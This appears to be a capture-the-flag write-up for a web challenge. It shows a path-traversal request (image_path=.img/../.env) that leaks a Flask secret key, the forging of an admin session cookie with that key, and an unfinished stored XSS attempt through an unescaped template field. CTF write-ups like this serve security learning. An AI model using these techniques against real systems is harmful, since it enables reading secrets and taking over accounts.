# Intro to web (<font color=green> Introduction </font>)


## Description

5 vulns, 5 stages - can you find them all?

## Tools Used

- 

## Skills Learned

- 

## Steps Taken
### Flag 1
1. From `FLAG_STAGE_1 = os.environ.get("FLAG_STAGE_1")`, to get Flag 1 we have to read .env file.
2. There is a `read_file(path)` function that reads file from path that starts with ./img and a POST request (`/note/new`) that call `read_file(path)` to read and display img file.
3. So we can send a POST request and change the path to `./img/../.env` and the env will be displayed on the site.
    ```
    fetch("https://redview-of-thunderous-wealth.gpn23.ctf.kitctf.de/note/new", {
    "headers": {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1"
    },
    "referrer": "https://redview-of-thunderous-wealth.gpn23.ctf.kitctf.de/note/new",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": "title=1&content=111&image_path=.img/../.env",
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
    });
    ```
4. The .env will be displayed as a broken image on the site but we can view it in inspect elements `src="data:image/png;base64, <.env>`. The .env will be base64 encoded so just decode it to get flag 1 and FLASK_APP_SECRET_KEY.
### Flag 2
1. From `app.mjs`, flag 2 is in a note and to access this note we have to gain moderator.
2. To gain moderator, we just have to set user role as `admin` seen from the `is_mod()` function. Since we have the flask key, we can forge a cookie with `admin` as user role using this [script](forge.py).
3. Replace session cookie with the forged cookie and go to `/moderator` and the flag will be in a note titled `My juicy note`
### Flag 3
1. Examining the `report_note.html`, we found a vulnability at `<p>Report reason: {{ note.reason|safe }}</p>`. This allows us to do XSS by inputting a script into report.
2. However we are unable to get the cookie as document.cookie came out empty. We also tried to capture any post request using `ngrok` but got nothing.
3. Unfortunately we were unable to solve this and moved on to other challenges. :(